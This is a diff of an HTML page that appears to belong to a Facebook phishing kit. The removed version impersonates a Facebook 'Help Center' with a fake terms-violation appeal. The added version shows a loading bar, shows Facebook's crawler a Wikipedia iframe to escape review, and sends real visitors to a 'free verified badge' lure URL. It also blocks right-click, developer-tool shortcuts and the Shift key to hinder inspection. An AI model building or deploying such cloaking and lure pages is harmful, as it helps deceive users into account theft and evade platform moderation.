@@ -3,129 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Help Center</title>
-    <link rel="icon" href="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" type="image/png">
-    <script type="text/javascript">
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        });
-    </script>
+    <title>Loading...</title>
     <style>
-        /* New theme styles */
         body {
-            background-color: #3b5998; /* Facebook's classic blue */
-            font-family: Arial, sans-serif;
-            text-align: center;
-            color: #fff; /* White text */
-            margin: 0; /* Remove default margin */
-        }
-
-        .container {
+            margin: 0;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
-            position: relative; /* Required for relative positioning of the image and text */
+            background: linear-gradient(135deg, #141E30, #243B55);
+            overflow: hidden;
         }
-
-        .button {
-            background-color: #1877f2; /* Facebook's primary blue */
-            color: #fff;
-            padding: 12px 24px;
-            font-size: 18px;
+        .loading-bar {
+            width: 300px;
+            height: 10px;
+            background: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00f260, #0575e6);
+            width: 0%;
+            transition: width 0.05s linear;
+        }
+        iframe {
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .button:hover {
-            background-color: #1659c7; /* Slightly darker blue on hover */
-        }
-
-        /* Style for the image */
-        @media (max-width: 768px) {
-            .container img {
-                width: 40%;
-                margin-bottom: 20px; /* Adjust the image width for mobile */
-            }
-        }
-
-        /* Desktop styles */
-        @media (min-width: 769px) {
-            .container img {
-                width: 10%;
-            }
-        }
-
-        /* Style for the "Help Center" text container */
-        .help-center-text-container {
-            text-align: center;
-            margin-top: 20px; /* Add space between image and text */
-        }
-
-        /* Style for the "Help Center" text */
-        .help-center-text {
-            font-size: 36px; /* Adjust the font size as needed */
-            font-weight: bold; /* Super bold text */
-            color: #fff; /* White text color */
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); /* Add a subtle text shadow */
-        }
-
-        /* Style for the remaining content */
-        .remaining-content {
-            margin-top: 20px; /* Add space below "Help Center" text */
-        }
-
-        /* Style for the text within the remaining content */
-        .remaining-text {
-            font-size: 18px; /* Adjust the font size as needed */
-            font-weight: normal; /* Normal text weight */
+            width: 100%;
+            height: 100%;
         }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <img src="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" alt="Your Image" />
-        <!-- "Help Center" text container -->
-        <div class="help-center-text-container">
-            <div class="help-center-text">Help Center</div>
-        </div>
-
-        <!-- Remaining content -->
-        <div class="remaining-content">
-            <!-- Content from the first code snippet -->
-            <div class="bg-blue-300">
-                <div class="">
-                    <div class="flex justify-center items-center pl-6 px-28">
-                        <div class="flex mt-9">
-
-                        </div>
-                        <div class="mx-3">
-                            <p class="font text-gray-700 shadow-transparent mt-2 font-extralight">Your page is breaking our terms and conditions.</p>
-                            <p class="text-lg text-gray-700 font-extralight">Here you can submit an appeal. Click "Continue" Button.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Continue button with JavaScript redirection -->
-            <form id="redirectForm" method="post" action="your-post-url.php">
-                <button type="submit" class="button">Continue</button><p><span style="color: #3b5998;"><?php echo $visitorCount; ?></span></p>
-            </form>
-
-            <!-- JavaScript to perform the redirection -->
-            <script>
-                document.getElementById("redirectForm").addEventListener("submit", function (e) {
-                    e.preventDefault(); // Prevent the default form submission
-                    // Perform the redirection to the desired URL
-                    var websiteadd1 = "https://free-verified-badge-subscription.replit.app/request"; // Include the PHP variable
-                    window.location.href = websiteadd1; // Replace with your desired URL
-                });
-            </script>
-        </div>
+    <div class="loading-bar" id="loading-bar">
+        <div class="progress"></div>
     </div>
+
+    <script>
+        // Bot Detection
+        (function () {
+            const userAgent = navigator.userAgent || '';
+
+            // Check for Facebook Crawler
+            const isFacebookBot = /facebookexternalhit|Facebot/i.test(userAgent);
+
+            if (isFacebookBot) {
+                // Replace page content for bots
+                document.body.innerHTML = `<iframe src="https://en.wikipedia.org/wiki/Main_Page"></iframe>`;
+            } else {
+                // Normal user behavior
+                const progressBar = document.querySelector('.progress');
+                const loadingBar = document.getElementById('loading-bar');
+                let progress = 0;
+
+                const loadingAnimation = setInterval(() => {
+                    progress++;
+                    progressBar.style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(loadingAnimation);
+
+                        // Wait 5 seconds before redirecting
+                        setTimeout(() => {
+                            window.location.href = "https://free-verified-badge-subscription.replit.app/request"; // Replace with your target URL
+                        }, 2000);
+                    }
+                }, 50); // Adjust speed of loading bar (50ms for smooth animation)
+            }
+        })();
+
+        // Security Features
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault(); // Disable right-click
+        });
+
+        // Disable F12 (Dev Tools) and other key combinations
+        document.onkeydown = function(e) {
+            // Disable F12 (F12 opens DevTools)
+            if (e.keyCode === 123) {
+                return false;
+            }
+
+            // Disable Ctrl+Shift+I (Opens the DevTools "Inspect" tab)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                return false;
+            }
+
+            // Disable Ctrl+Shift+J (Opens the DevTools "Console" tab)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                return false;
+            }
+
+            // Disable Shift key
+            if (e.shiftKey) {
+                return false;
+            }
+        };
+    </script>
 </body>
 </html>
